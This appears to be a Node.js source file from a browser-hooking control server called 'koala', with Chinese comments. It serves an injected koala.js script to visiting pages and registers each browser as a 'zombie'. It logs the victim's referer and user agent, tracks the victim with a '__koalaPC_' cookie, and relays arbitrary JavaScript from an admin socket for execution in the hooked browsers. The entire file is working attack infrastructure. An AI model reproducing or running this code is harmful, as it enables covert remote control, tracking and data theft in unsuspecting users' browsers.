//var Socketio = require('socket.io');
var fs = require('fs');
var path = require('path');
var pc = require('../proxy').pc;
var project = require('../proxy').project;
var eventproxy = require('eventproxy');
var logger = require('../common/logger');

exports.online = function(server, admin_io, zombie_io){
    admin_io.on('connection',function(socket){
        socket.on('execJSServer',function(data){
            zombie_io.to(data.pcID).emit('exec',data.jsCode);
        });
        zombie_io.on('callbackExec',function(data){
            //console.log(data);
        })
    });

    zombie_io.on('connection',function(socket){
        var cookie = socket.handshake.headers.cookie;
        var pc_id;
        if(pc_id = cookie.match(/__koalaPC_=(.*?)(;|$)/)){
            var pc_socket_id = pc_id[1];
        }
        else{
            logger.err('no cookie!');
            //TODO 异常处理
        }

        //把主机信息入库. 获取项目信息  来一个socket join 一个room
        pc.getNamesByQuery({},{},function(err,data){
            if(err){
                logger.err(err);
                return;
            }else{
                admin_io.emit('updatePC', data);
            }
        });
        //ua,host,origin,user-agent,referer,cookie,
        socket.on('init',function(data){

            //异步 一部分是传输过来,一部分是socket获取.
            var ep = eventproxy();
            ep.fail('err',function(err){
                logger.err(err);
                return;
            });
            ep.all('project', 'socket_get',function(projectName, socket_data){
                //建立一个room
                var update_time = Date.now();
                var zombie_url = socket_data['zombie_referer'];
                var zombie_ua = socket_data['zombie_ua'];
                pc.addPC(projectName, update_time,zombie_url,zombie_ua,true,pc_socket_id, function(err,data){
                    if(err){
                        ep.emit('err',err);
                    }
                    socket.join(pc_socket_id);
                    socket['pc_id'] = data.socket_id;

                    zombie_io.to(data.socket_id).emit('exec','document.cookie="__koalaP_='+data.socket_id+'"');
                });
            });
            //获取项目信息
            project.getNamesByQuery({_id:data.projectID},{},function(err,project_data){
                if(err){
                    ep.emit('err',err);
                }
                if(project_data.length != 0 ){
                    var projectName = project_data[0].name;
                    ep.emit('project',projectName);
                }
            });
            try{
                var zombie_referer = socket.handshake.headers.referer;
                var zombie_ua = socket.handshake.headers['user-agent'];

                var socket_data = {
                    'zombie_referer': zombie_referer,
                    'zombie_ua': zombie_ua
                };
                ep.emit('socket_get', socket_data);
            }catch(e){
                logger.err(e);
                return;
            }
        });
        //处理状态更新
        socket.on('updateZombieStatus',function(data){
            //update  触发前端进行更新.
            socket.join(data.pc_socket_id)
        });
        //disconet
        socket.on('disconnect',function(data){
            //pc.updatePC({_id:});
            try{
                var pc_socket_id = socket.handshake.headers.cookie.match(/__koalaPC_=(.*?)(;|$)/)[1];
            }catch(e){
                logger.err('cookie error!');
            }
            pc.updatePC({'socket_id':pc_socket_id},{'status':false},{},function(err,data){
                if(err){
                    logger.err('db error');
                    return;
                }
            });
        })
    });


};

exports.index = function(req,res,next){
    //发送js文件内容 或者数据库
    //socket.js 发过去
    //var project_id = req.path.substring(1);
    var host = req.header('host');
    var cookie = req.cookies;
    var projectid = req.url.match(/\/(.{24})/)[1];
    //当判断到有cookie的时候 新建一个连接 更新数据库
    //当是不同页面的时候
    if(cookie.__koalaPC_){
        var pc_resocket_id = Date.now();
        pc.updatePC({'socket_id':cookie.__koalaPC_,'zombie_url':req.headers.referer,'zombie_ua':req.headers['user-agent']},{
            'socket_id':pc_resocket_id,
            'status': true
        },{},function(err){
            if(err){
                logger.err(err);
                return;
            }
            fs.readFile(path.join(__dirname, '../koala.js'),function(err,data){
                if(err){
                    throw err;
                }
                var initKoala = data.toString();
                var initData = initKoala.replace(/\{~socketiourl~\}/g,host);
                initData = initData.replace(/\{~projectid~\}/g, projectid);
                initData = initData.replace(/\{~socketcookie~\}/g, pc_resocket_id);
                res.append('Set-Cookie', '__koalaPC_='+pc_resocket_id+'; Path=/;');
                res.send(initData);
            });
        });
    }else{
        var pc_socket_id = Date.now();
        fs.readFile(path.join(__dirname, '../koala.js'),function(err,data){
            if(err){
                throw err;
            }
            var initKoala = data.toString();
            var initData = initKoala.replace(/\{~socketiourl~\}/g,host);
            initData = initData.replace(/\{~projectid~\}/g, projectid);
            res.append('Set-Cookie', '__koalaPC_='+pc_socket_id+'; Path=/;');
            res.send(initData);
        });
    }

    //res.send("");
    //res.send('');
    //res.send('alert(1)');
    //引入jquery TODO: 引入我的框架
    //init socket.io
    //注册事件
};